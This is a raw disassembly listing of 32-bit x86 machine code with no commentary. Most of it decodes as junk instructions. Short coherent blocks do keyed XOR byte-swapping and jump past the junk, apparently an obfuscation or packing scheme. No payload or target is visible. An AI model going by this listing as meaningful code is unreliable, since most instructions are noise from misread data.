  404a03:	xchg   ecx,eax
  404a04:	jl     0x4049a4
  404a06:	jmp    FWORD PTR ds:0x8ef3014d
  404a0c:	ror    DWORD PTR [ebp-0x57],0x63
  404a10:	sahf   
  404a11:	pop    ecx
  404a12:	jnp    0x4049bb
  404a14:	push   0x26f5273e
  404a19:	inc    edx
  404a1a:	mov    edx,0xc098f30d
  404a1f:	adc    BYTE PTR [ecx-0x3],dh
  404a22:	fcomip st,st(7)
  404a24:	push   ecx
  404a25:	mov    eax,0x539fe14a
  404a2a:	test   al,0x3c
  404a2c:	inc    edx
  404a2d:	pop    ss
  404a2e:	inc    edi
  404a2f:	xlat   BYTE PTR ds:[ebx]
  404a30:	jl     0x404aac
  404a32:	aaa    
  404a33:	sbb    eax,0x137d3f67
  404a38:	neg    DWORD PTR [esi+0x6f]
  404a3b:	sti    
  404a3c:	cwde   
  404a3d:	push   ds
  404a3e:	adc    eax,0xad9e5132
  404a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a44:	jo     0x404a4d
  404a46:	xchg   ecx,eax
  404a47:	bound  ebx,QWORD PTR gs:[ebx]
  404a4a:	stos   DWORD PTR es:[edi],eax
  404a4b:	stc    
  404a4c:	push   ebx
  404a4d:	and    ah,BYTE PTR [ebp-0xb700fdb]
  404a53:	inc    esi
  404a54:	mov    eax,0x1c97677
  404a59:	std    
  404a5a:	push   edi
  404a5b:	jns    0x404a4f
  404a5d:	(bad)  
  404a5f:	push   ebp
  404a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a61:	xchg   ecx,eax
  404a62:	ss inc edx
  404a64:	inc    edi
  404a65:	jmp    0x4049f3
  404a67:	in     eax,0xf2
  404a69:	neg    DWORD PTR [eax+eiz*1-0x4c]
  404a6d:	xchg   edi,eax
  404a6e:	js     0x404aa0
  404a70:	test   DWORD PTR ds:0xb5da9380,0xa8ced0fd
  404a7a:	jmp    0x77a0878e
  404a7f:	sub    al,0x9f
  404a81:	xchg   esp,eax
  404a82:	mov    gs,WORD PTR [ecx+0x38]
  404a85:	inc    ecx
  404a86:	js     0x404aaf
  404a88:	stc    
  404a89:	adc    eax,0x6eef7180
  404a8e:	iret   
  404a8f:	cmp    al,0x64
  404a91:	in     eax,0xa7
  404a93:	pop    esp
  404a94:	sbb    edi,DWORD PTR [ecx]
  404a96:	scas   al,BYTE PTR es:[edi]
  404a97:	pop    eax
  404a98:	inc    esi
  404a99:	jbe    0x404aef
  404a9b:	mov    bh,0xf3
  404a9d:	hlt    
  404a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a9f:	test   DWORD PTR [ecx+esi*2-0x6a3a4952],0x32f445c7
  404aaa:	test   DWORD PTR [eax+edi*8+0x33bc45c7],ebx
  404ab1:	test   DWORD PTR [eax+edi*8+0x33e8558b],ebx
  404ab8:	rol    BYTE PTR [ebx],1
  404aba:	shr    ecx,1
  404abc:	imul   eax,DWORD PTR [ebx],0x0
  404abf:	add    BYTE PTR [ebx-0x2fcc17ab],cl
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xa33c6a28
  404b32:	loope  0x404b0e
  404b34:	mov    BYTE PTR [edx+0x587e7e22],ah
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b39
  404b3e:	cld    
  404b3f:	mov    esp,0xe3326b68
  404b44:	and    esi,DWORD PTR [ebp+0x7e]
  404b47:	mov    ecx,DWORD PTR [edi]
  404b49:	es adc edx,ebx
  404b4c:	clc    
  404b4d:	les    ecx,FWORD PTR [esi-0x10]
  404b50:	dec    ebx
  404b51:	jbe    0x404b7f
  404b53:	xchg   ebp,eax
  404b54:	mov    ah,0xd
  404b56:	and    BYTE PTR [esi-0x4b],ch
  404b59:	in     eax,dx
  404b5a:	jl     0x404b5c
  404b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b5d:	sub    eax,0x4893916c
  404b62:	jle    0x404b18
  404b64:	sbb    eax,DWORD PTR [eax+0x36]
  404b67:	dec    eax
  404b68:	adc    edi,ebp
  404b6a:	sti    
  404b6b:	loopne 0x404bcc
  404b6d:	xchg   ebp,eax
  404b6e:	imul   edi,DWORD PTR [eax-0x2f],0xb528e37e
  404b75:	or     BYTE PTR [esi-0x5],ah
  404b78:	(bad)  
  404b79:	pushf  
  404b7a:	ins    DWORD PTR es:[edi],dx
  404b7b:	add    esi,edi
  404b7d:	or     ebx,DWORD PTR [ebp-0x472ecf20]
  404b83:	pop    ds
  404b84:	sbb    bh,ah
  404b86:	push   esi
  404b87:	xor    bl,dl
  404b89:	cmp    esi,DWORD PTR [esi-0x345c576a]
  404b8f:	jmp    0x94c4:0x67cd8176
  404b96:	mov    fs,edx
  404b98:	in     eax,0xea
  404b9a:	lods   al,BYTE PTR cs:[esi]
  404b9c:	xor    BYTE PTR [ebp-0x5369e964],cl
  404ba2:	outs   dx,DWORD PTR ds:[esi]
  404ba3:	nop
  404ba4:	ret    0x3cfc
  404ba7:	push   cs
  404ba8:	and    eax,0x7a2d669e
  404bad:	rcl    BYTE PTR [ecx+esi*8+0x3ea9610c],cl
  404bb4:	mov    WORD PTR [edx-0x5],fs
  404bb7:	aas    
  404bb8:	rcl    BYTE PTR [ecx],1
  404bba:	dec    ebx
  404bbb:	xchg   esp,eax
  404bbc:	jge    0x404b8d
  404bbe:	push   0x1e
  404bc0:	cwde   
  404bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bc2:	sub    DWORD PTR [esp+ebx*4+0x4d],esp
  404bc6:	mov    BYTE PTR [eax+0x20],bl
  404bc9:	in     eax,0xdd
  404bcb:	mov    BYTE PTR [esi+0x386be80a],bh
  404bd1:	or     BYTE PTR [edx],al
  404bd3:	in     al,dx
  404bd4:	inc    esi
  404bd5:	addr16 push ebx
  404bd7:	or     al,BYTE PTR [eax+0x5f0e0dd2]
  404bdd:	idiv   DWORD PTR [ebp-0x11]
  404be0:	(bad)  
  404be1:	pop    ss
  404be2:	icebp  
  404be3:	ja     0x404b9e
  404be5:	stos   BYTE PTR es:[edi],al
  404be6:	push   0xf7fc162
  404beb:	inc    edi
  404bec:	xchg   esp,eax
  404bed:	(bad)  
  404bee:	aad    0x80
  404bf0:	push   eax
  404bf1:	pop    ds
  404bf2:	cmp    eax,0x55cfde81
  404bf7:	clc    
  404bf8:	or     esp,DWORD PTR [esi+0x4d]
  404bfb:	mov    ecx,0xbfb32826
  404c00:	pop    esp
  404c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c02:	call   0x532bf5e4
  404c07:	jnp    0x404b8b
  404c09:	jae    0x404c0b
  404c0b:	and    DWORD PTR [edx],eax
  404c0d:	fdiv   DWORD PTR [ebp+0x7af9dd69]
  404c13:	loope  0x404c00
  404c15:	sub    BYTE PTR [esi+0x3ae52472],cl
  404c1b:	(bad)  
  404c1c:	jne    0x404c0f
  404c1e:	lds    ecx,FWORD PTR [ebx]
  404c20:	idiv   BYTE PTR [ebx+0x3ca2eba5]
  404c26:	inc    eax
  404c27:	mov    edx,0x73681e71
  404c2c:	xchg   edi,eax
  404c2d:	popa   
  404c2e:	pop    es
  404c2f:	js     0x404bc2
  404c31:	sbb    DWORD PTR [ebx+0x39],0xe31fff22
  404c38:	jecxz  0x404c34
  404c3a:	pop    ecx
  404c3b:	inc    edi
  404c3c:	scas   eax,DWORD PTR es:[edi]
  404c3d:	idiv   DWORD PTR [edi+0x6b]
  404c40:	fnstcw WORD PTR [esi+0x60]
  404c43:	leave  
  404c44:	push   esp
  404c45:	and    al,0xee
  404c47:	popa   
  404c48:	jbe    0x404c33
  404c4a:	lea    esi,[edx-0x63]
  404c4d:	rcl    DWORD PTR [ebx],cl
  404c4f:	mov    bh,0x29
  404c51:	add    di,si
  404c54:	stos   BYTE PTR es:[edi],al
  404c55:	int    0xeb
  404c57:	stos   DWORD PTR es:[edi],eax
  404c58:	aad    0xc7
  404c5a:	sub    DWORD PTR [edi-0x646a7352],0x613b38a8
  404c64:	adc    BYTE PTR [esi],bh
  404c66:	adc    ah,BYTE PTR [edi+edx*8-0x531d9892]
  404c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c6e:	arpl   WORD PTR [ecx],di
  404c70:	int3   
  404c71:	mov    dl,0x71
  404c73:	xchg   edi,eax
  404c74:	js     0x404c00
  404c76:	sub    eax,DWORD PTR [ecx-0x4c]
  404c79:	rcr    DWORD PTR [eax+edx*8],cl
  404c7c:	push   esp
  404c7d:	lods   al,BYTE PTR ds:[esi]
  404c7e:	or     eax,0xcbb23a2c
  404c83:	jbe    0x404c76
  404c85:	xchg   ebx,eax
  404c86:	cmp    ebx,DWORD PTR [esi-0x46d5675e]
  404c8c:	jns    0x404c8d
  404c8e:	push   esp
  404c8f:	xchg   esp,eax
  404c90:	push   esi
  404c91:	mov    cl,0x81
  404c93:	repnz sbb al,0x7f
  404c96:	or     dl,BYTE PTR [esi+0x7f]
  404c99:	mov    edx,0xf0f55b3b
  404c9e:	jp     0x404cb8
  404ca0:	lock repz dec edx
  404ca3:	push   0x6f6bca04
  404ca8:	fsub   QWORD PTR [eax-0x5c700396]
  404cae:	xor    DWORD PTR [esi-0x3],esi
  404cb1:	mov    eax,0x351d113e
  404cb6:	jge    0x404c38
  404cb8:	mov    ah,BYTE PTR [edx+ebx*8-0x53]
  404cbc:	adc    esi,DWORD PTR [edi+0x1d]
  404cbf:	mov    eax,ds:0x4eef0e78
  404cc4:	cmp    dl,ch
  404cc6:	sti    
  404cc7:	out    dx,al
  404cc8:	xchg   edx,eax
  404cc9:	outs   dx,BYTE PTR ds:[esi]
  404cca:	call   0x9f678a2e
  404ccf:	sahf   
  404cd0:	fnstsw WORD PTR [edi]
  404cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cd4:	xor    ecx,DWORD PTR [edi-0x678a2ed]
  404cda:	mov    ds:0x9e23d011,eax
  404cdf:	add    al,bl
  404ce1:	rcr    DWORD PTR [edx],0x92
  404ce4:	popa   
  404ce5:	ror    BYTE PTR [edx+0x72],0x8b
  404ce9:	es enter 0x7e4a,0x7c
  404cee:	mov    esi,0x4f2aaff1
  404cf3:	int    0xda
  404cf5:	jecxz  0x404cb3
  404cf7:	jbe    0x404d61
  404cf9:	retf   
  404cfa:	mov    bh,0xe3
  404cfc:	aas    
  404cfd:	addr16 aam 0xa1
  404d00:	or     ch,BYTE PTR [ecx+0x2dba9d96]
  404d06:	add    DWORD PTR [ecx+0x34],edi
  404d09:	add    BYTE PTR [ecx+eiz*1-0xc8acfb3],dh
  404d10:	jge    0x404cb6
  404d12:	mov    ebx,0x5089f465
  404d17:	pusha  
  404d18:	mov    al,0x59
  404d1a:	or     eax,0x24ac2059
  404d1f:	mov    dl,0xac
  404d21:	mov    esi,0x34681f13
  404d26:	sub    BYTE PTR [ebx-0x3de7ec51],cl
  404d2c:	out    0x1d,eax
  404d2e:	out    0x7f,eax
  404d30:	sbb    eax,0xf9da4473
  404d35:	in     al,dx
  404d36:	jle    0x404cd1
  404d38:	(bad)  
  404d39:	jl     0x404d86
  404d3b:	push   0x12678511
  404d40:	std    
  404d41:	dec    ebp
  404d42:	push   ebx
  404d43:	or     DWORD PTR [eax+eax*8+0x56],edx
  404d47:	ficom  WORD PTR [edi+0x3e1ab271]
  404d4d:	cdq    
  404d4e:	sbb    bh,ch
  404d50:	in     eax,0xb3
  404d52:	int    0xb9
  404d54:	js     0x404d6e
  404d56:	scas   al,BYTE PTR es:[edi]
  404d57:	cld    
  404d58:	psubusw mm0,QWORD PTR [ebx-0x3b2152ff]
  404d5f:	xor    dl,BYTE PTR [edx]
  404d61:	imul   esp,ecx,0x52ac811d
  404d67:	rcl    BYTE PTR [esi+edi*4+0x7a25c596],cl
  404d6e:	jecxz  0x404d43
  404d70:	cdq    
  404d71:	scas   eax,DWORD PTR es:[edi]
  404d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d73:	fldenv [ebx-0x50]
  404d76:	mov    ecx,0x2e3787ea
  404d7b:	dec    ebx
  404d7c:	dec    ecx
  404d7d:	jo     0x404d53
  404d7f:	mov    eax,0x50f22077
  404d84:	dec    ebx
  404d85:	fmul   QWORD PTR [edx]
  404d87:	push   ebp
  404d88:	xchg   edx,eax
  404d89:	dec    ecx
  404d8a:	xor    DWORD PTR [ebx-0x1954e104],0xffffff86
  404d91:	ret    0x476a
  404d94:	sub    eax,0x4a0e446b
  404d99:	dec    edx
  404d9a:	imul   eax,DWORD PTR [edi+0x5],0xfffffffc
  404d9e:	stos   DWORD PTR es:[edi],eax
  404d9f:	add    bl,BYTE PTR [ecx]
  404da1:	jmp    0x4a900f6a
  404da6:	xlat   BYTE PTR ds:[ebx]
  404da7:	test   DWORD PTR [ebx-0x4eb3002],edi
  404dad:	pop    esi
  404dae:	in     al,0x5b
  404db0:	int    0x8
  404db2:	hlt    
  404db3:	push   0x8
  404db5:	mov    ah,0xc5
  404db7:	retf   
  404db8:	push   0x166bf177
  404dbd:	jne    0x404d6c
  404dbf:	jmp    0x404dbd
  404dc1:	sbb    eax,0xa1169a04
  404dc6:	mov    al,ds:0x9bc8f085
  404dcb:	dec    edi
  404dcc:	enter  0xfefe,0x1a
  404dd0:	mov    edx,0x99dfb72e
  404dd5:	das    
  404dd6:	push   ecx
  404dd7:	jo     0x404e12
  404dd9:	test   edi,0xc90de5dc
  404ddf:	mov    dh,0x75
  404de1:	xlat   BYTE PTR ds:[ebx]
  404de2:	cld    
  404de3:	xchg   ecx,eax
  404de4:	mov    edx,0xa6e1743c
  404de9:	nop
  404dea:	push   eax
  404deb:	and    bl,BYTE PTR [ecx]
  404ded:	dec    ebx
  404dee:	outs   dx,DWORD PTR ds:[esi]
  404def:	pop    esp
  404df0:	stc    
  404df1:	pop    eax
  404df2:	xchg   ebp,eax
  404df3:	xor    al,0x99
  404df5:	(bad)  
  404df6:	xchg   ebx,eax
  404df7:	cmp    DWORD PTR [edi*2+0x3110c29b],esi
  404dfe:	int3   
  404dff:	outs   dx,BYTE PTR ds:[esi]
  404e00:	sub    BYTE PTR [ecx-0x7d],bh
  404e03:	push   0xd3bbeb2
  404e08:	add    al,0x5e
  404e0a:	retf   0x452a
  404e0d:	fdiv   st(3),st
  404e0f:	int3   
  404e10:	repz xor eax,0x41dc939d
  404e16:	mov    bl,0x2b
  404e18:	cmp    ebx,edi
  404e1a:	(bad)
  404e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e1f:	and    al,0x7a
  404e21:	adc    eax,0xff9035e
  404e26:	scas   eax,DWORD PTR es:[edi]
  404e27:	xlat   BYTE PTR ds:[ebx]
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e67
  404e5e:	mov    ebx,0x218cf36e
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e99
  404e6a:	div    BYTE PTR [esi+ecx*2-0x27782971]
  404e71:	daa    
  404e72:	shl    DWORD PTR [ebp-0x6a],0xcb
  404e76:	mov    al,0xf5
  404e78:	lahf   
  404e79:	mov    ebx,0x2eade8ff
  404e7e:	push   ds
  404e7f:	push   es
  404e80:	out    dx,eax
  404e81:	test   eax,0x2bdc2684
  404e86:	or     eax,0xf7735cc0
  404e8b:	call   DWORD PTR [eax]
  404e8d:	fidivr WORD PTR [edx*2+0x4e7afea0]
  404e94:	dec    esp
  404e95:	loopne 0x404eca
  404e97:	fsub   QWORD PTR [esi-0x77]
  404e9a:	pushf  
  404e9b:	pop    ecx
  404e9c:	enter  0xa754,0xdb
  404ea0:	or     al,BYTE PTR [esi+0x3d]
  404ea3:	retf   
  404ea4:	aas    
  404ea5:	xchg   ebp,eax
  404ea6:	(bad)  
  404ea7:	div    BYTE PTR [edx-0x7d]
  404eaa:	popa   
  404eab:	retf   
  404eac:	adc    dh,dh
  404eae:	lods   eax,DWORD PTR ds:[esi]
  404eaf:	les    esp,FWORD PTR [ebx+eax*8]
  404eb2:	sub    al,0xe3
  404eb4:	or     BYTE PTR [eax-0x6ef77009],ah
  404eba:	int3   
  404ebb:	mov    esp,0x49284f58
  404ec0:	popf   
  404ec1:	aad    0xa5
  404ec3:	add    esi,DWORD PTR [ebx+0x5a]
  404ec6:	into   
  404ec7:	(bad)  
  404ec8:	and    DWORD PTR [edx],edi
  404eca:	sahf   
  404ecb:	repz jg 0x404ec6
  404ece:	sub    eax,0xa725d278
  404ed3:	enter  0x4bf7,0x6f
  404ed7:	repnz and DWORD PTR [eax-0x382c83e1],ebx
  404ede:	das    
  404edf:	pop    ds
  404ee0:	call   0xc853948a
  404ee5:	(bad)  
  404ee6:	adc    DWORD PTR [ecx-0x73],edx
  404ee9:	pop    edx
  404eea:	imul   ebp,ebx,0x53
  404eed:	xor    DWORD PTR [eax+ebx*2],edi
  404ef0:	sbb    BYTE PTR [ebp+0x4d],0x57
  404ef4:	mov    ecx,0x5dad8c9f
  404ef9:	inc    ecx
  404efa:	xchg   edx,eax
  404efb:	mov    ds:0xcb4300e1,eax
  404f00:	adc    esp,ecx
  404f02:	or     esp,ecx
  404f04:	mov    ch,0x0
  404f06:	cmp    DWORD PTR [eax+0x11],edi
  404f09:	push   ds
  404f0a:	shl    DWORD PTR [esi],cl
  404f0c:	mov    ds:0x82ab2a06,al
  404f11:	fstp   QWORD PTR [eax+0x8c21ca]
  404f17:	lea    ecx,[eax]
  404f19:	add    dl,cl
  404f1b:	sub    BYTE PTR [ebp-0x64a6a451],0x20
  404f22:	pop    esp
  404f23:	dec    ecx
  404f24:	push   esp
  404f25:	jmp    DWORD PTR [esi+0x24]
  404f28:	xor    dl,bl
  404f2a:	add    al,0x94
  404f2c:	scas   eax,DWORD PTR es:[edi]
  404f2d:	inc    ecx
  404f2e:	test   BYTE PTR cs:[ebx+0x6148d8f9],0xa0
  404f36:	xchg   esp,eax
  404f37:	je     0x404f37
  404f39:	or     esp,esp
  404f3b:	outs   dx,BYTE PTR ds:[esi]
  404f3c:	mov    edi,0xb0e18cbd
  404f41:	fisub  WORD PTR [edi]
  404f43:	icebp  
  404f44:	cmp    ch,BYTE PTR [eax+ebp*8-0x78]
  404f48:	sub    edx,edx
  404f4a:	mov    ch,0x3b
  404f4c:	rcr    BYTE PTR [edi+0x18],1
  404f4f:	loopne 0x404eff
  404f51:	xchg   ebp,eax
  404f52:	jne    0x404fc8
  404f54:	icebp  
  404f55:	rol    dl,1
  404f57:	call   0x47d23897
  404f5c:	fisttp QWORD PTR [edi-0xe]
  404f5f:	pop    edx
  404f60:	jno    0x404f36
  404f62:	addr16 inc esi
  404f64:	ret    
  404f65:	xchg   ebx,eax
  404f66:	pop    ds
  404f67:	in     al,dx
  404f68:	(bad)  
  404f69:	cmc    
  404f6a:	mov    esi,0xd214597c
  404f6f:	push   esp
  404f70:	sti    
  404f71:	jl     0x404fed
  404f73:	(bad)  
  404f74:	retf   
  404f75:	fstp   st(6)
  404f77:	sar    BYTE PTR [ecx-0x74b66e1e],0x87
  404f7e:	rcr    BYTE PTR [ebp+ebx*2+0x48],cl
  404f82:	mov    al,ds:0x7f318aa8
  404f87:	mov    ?,WORD PTR [ebp-0x37]
  404f8a:	sub    dh,BYTE PTR [esi+0x16]
  404f8d:	adc    al,0xe4
  404f8f:	xor    DWORD PTR [esi+ebx*2+0x20],edi
  404f93:	clc    
  404f94:	pushf  
  404f95:	adc    ebp,DWORD PTR [eax-0x2b]
  404f98:	cmp    al,0x60
  404f9a:	call   0x796b:0x9b54576a
  404fa1:	ins    DWORD PTR es:[edi],dx
  404fa2:	sbb    ebp,DWORD PTR [esi+edi*2]
  404fa5:	push   0x28
  404fa7:	or     al,0xad
  404fa9:	jp     0x405025
  404fab:	and    eax,0x70737d9b
  404fb0:	or     al,0x4
  404fb2:	pop    es
  404fb3:	push   ebp
  404fb4:	out    0x0,al
  404fb6:	pmaxsw mm5,QWORD PTR [esi-0x5c773cf1]
  404fbd:	sti    
  404fbe:	loop   0x404f55
  404fc0:	sbb    DWORD PTR [eax],0xc503a9a0
  404fc6:	pop    edx
  404fc7:	test   eax,0x341e7afb
  404fcc:	mov    ah,BYTE PTR [eax-0x3a8ee019]
  404fd2:	add    al,0x56
  404fd4:	gs dec ecx
  404fd6:	pop    es
  404fd7:	jp     0x404ff5
  404fd9:	lds    ebp,FWORD PTR [edi-0x6f]
  404fdc:	and    cl,bl
  404fde:	inc    ebp
  404fdf:	add    DWORD PTR [esi+0x5b173720],0x30
  404fe6:	daa    
  404fe7:	mov    DWORD PTR [edi],eax
  404fe9:	ja     0x405065
  404feb:	mov    ch,0x2c
  404fed:	into   
  404fee:	mov    BYTE PTR [ecx+0x7723015d],bl
  404ff4:	sbb    BYTE PTR [edx-0x7a1af618],bh
  404ffa:	adc    edi,DWORD PTR [ecx]
  404ffc:	cmp    ecx,DWORD PTR [edx-0x36083dff]
  405002:	add    al,BYTE PTR [esi+ecx*4-0x1ad88115]
  405009:	xlat   BYTE PTR ds:[ebx]
  40500a:	mov    bh,0xdd
  40500c:	and    BYTE PTR [eax],dh
  40500e:	int3   
  40500f:	push   edx
  405010:	sbb    DWORD PTR [ecx],edx
  405012:	xchg   ebp,eax
  405013:	(bad)  
  405015:	int    0xc0
  405017:	(bad)  
  405018:	retf   
  405019:	pop    esp
  40501a:	mov    al,ds:0x430861fd
  40501f:	out    dx,al
  405020:	fwait
  405021:	cmp    edx,DWORD PTR [esi]
  405023:	arpl   WORD PTR [edi+edx*1],dx
  405026:	nop
  405027:	dec    edi
  405028:	out    0xed,al
  40502a:	inc    esi
  40502b:	cmp    bl,BYTE PTR [esi]
  40502d:	clc    
  40502e:	rol    BYTE PTR [eax+0x19],1
  405031:	mov    al,0x4e
  405033:	dec    ebx
  405034:	(bad)  
  405035:	dec    edi
  405036:	fcomp  QWORD PTR [ecx-0x5fa7c782]
  40503c:	sbb    dl,BYTE PTR [ebx-0x414b829f]
  405042:	mov    ebx,0xed2ba38
  405047:	or     al,0xd6
  405049:	call   FWORD PTR ds:0x307d5954
  40504f:	ins    BYTE PTR es:[edi],dx
  405050:	cmp    bl,ah
  405052:	cmp    eax,0xd1652cd4
  405057:	loop   0x40506c
  405059:	lods   eax,DWORD PTR ds:[esi]
  40505a:	iret   
  40505b:	test   eax,0x33ca264c
  405060:	and    eax,0x93e12c82
  405065:	jae    0x40500d
  405067:	fsub   DWORD PTR [eax-0x65d118e3]
  40506d:	(bad)  
  40506e:	clc    
  40506f:	idiv   DWORD PTR [eax-0x1b]
  405072:	ja     0x4050ba
  405074:	xor    eax,0xa40a82e0
  405079:	xchg   ebp,eax
  40507a:	jno    0x405073
  40507c:	mov    ebx,0xc138a913
  405081:	out    dx,al
  405082:	mov    ebx,0xed3e2b7
  405087:	js     0x405032
  405089:	xor    bh,BYTE PTR [ebp-0x538881b7]
  40508f:	pushf  
  405090:	fs adc al,0x32
  405093:	fiadd  WORD PTR [ebx-0x42d6f82a]
  405099:	dec    esp
  40509a:	dec    edi
  40509b:	mov    edx,0xd5f2d968
  4050a0:	test   eax,0xa81ec73d
  4050a5:	repz jae 0x4050f5
  4050a8:	pop    edi
  4050a9:	mov    bh,0xfd
  4050ab:	out    dx,eax
  4050ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050ad:	(bad)  
  4050ae:	(bad)
  4050b1:	(bad)  
  4050b2:	mov    DWORD PTR es:[ecx+0x5e],ebx
  4050b6:	out    dx,al
  4050b7:	bnd js 0x405103
  4050ba:	fsubr  st(7),st
  4050bc:	sti    
  4050bd:	not    edi
  4050bf:	mov    ah,0x38
  4050c1:	mov    ecx,DWORD PTR [ebp-0x58]
  4050c4:	push   ebp
  4050c5:	in     eax,dx
  4050c6:	fst    DWORD PTR [esi-0x675eedd5]
  4050cc:	push   ebp
  4050cd:	sub    DWORD PTR [edx+0x27d253ef],eax
  4050d3:	jmp    0xc8dcccc0
  4050d8:	or     al,0x6f
  4050da:	cdq    
  4050db:	retf   
  4050dc:	mov    dl,0x3c
  4050de:	xor    eax,0x4cdf78b6
  4050e3:	pop    es
  4050e4:	shl    BYTE PTR [edi+0x29],1
  4050e7:	mov    ch,0xad
  4050e9:	ss cld 
  4050eb:	leave  
  4050ec:	out    dx,al
  4050ed:	data16 aaa 
  4050ef:	push   cs
  4050f0:	sub    al,0x83
  4050f2:	mov    ebx,?
  4050f4:	push   es
  4050f5:	xlat   BYTE PTR ds:[ebx]
  4050f6:	inc    esp
  4050f7:	xchg   esp,eax
  4050f8:	(bad)  
  4050fa:	lds    ebp,FWORD PTR [ebp+0x77a7d547]
  405100:	jnp    0x40509f
  405102:	jns    0x405177
  405104:	add    ebx,DWORD PTR [edx+ebp*1+0x426dd693]
  40510b:	jecxz  0x405187
  40510d:	pop    esp
  40510e:	fsub   DWORD PTR [edx-0x6a]
  405111:	pop    eax
  405112:	jmp    0x40509d
  405114:	cdq    
  405115:	hlt    
  405116:	fdiv   DWORD PTR [edi]
  405118:	sahf   
  405119:	jle    0x4050aa
  40511b:	pop    ss
  40511c:	push   ecx
  40511d:	(bad)  
  40511e:	icebp  
  40511f:	mov    eax,ebx
  405121:	cmp    DWORD PTR [ecx-0x2e591877],esi
  405127:	leave  
  405128:	dec    esi
  405129:	in     al,dx
  40512a:	xchg   edi,eax
  40512b:	ret    0xf7b8
  40512e:	and    eax,0xb118db35
  405133:	fist   WORD PTR [esi+0x49]
  405136:	inc    ebp
  405137:	add    al,0x84
  405139:	dec    edx
  40513a:	retf   
  40513b:	add    al,0xbf
  40513d:	push   ebx
  40513e:	jl     0x4050dc
  405140:	cwde   
  405141:	scas   eax,DWORD PTR es:[edi]
  405142:	cmp    eax,0x1ab0441d
  405147:	outs   dx,DWORD PTR ds:[esi]
  405148:	mov    DWORD PTR [ebp+0x39],esi
  40514b:	mov    dh,0xcb
  40514d:	add    ecx,DWORD PTR [edi+ecx*1]
  405150:	scas   eax,DWORD PTR es:[edi]
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	ins    DWORD PTR es:[edi],dx
  405172:	leave  
  405173:	cmp    ebx,DWORD PTR [ecx]
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x405172
  40517e:	dec    edi
  40517f:	cmc    
  405180:	push   cs
  405181:	jg     0x4051d4
  405183:	arpl   WORD PTR [ecx+0x1],dx
  405186:	les    edx,FWORD PTR [eax+ebp*1+0x4c9f1940]
  40518d:	jo     0x4051f1
  40518f:	mov    ds:0x42af5a0e,al
  405194:	sbb    DWORD PTR ss:[eax],ebx
  405197:	in     al,0xc2
  405199:	jnp    0x4051ea
  40519b:	push   es
  40519c:	mov    BYTE PTR [ecx-0x165923ae],ch
  4051a2:	mov    dl,0xd6
  4051a4:	scas   al,BYTE PTR es:[edi]
  4051a5:	push   ss
  4051a6:	loope  0x4051e9
  4051a8:	pusha  
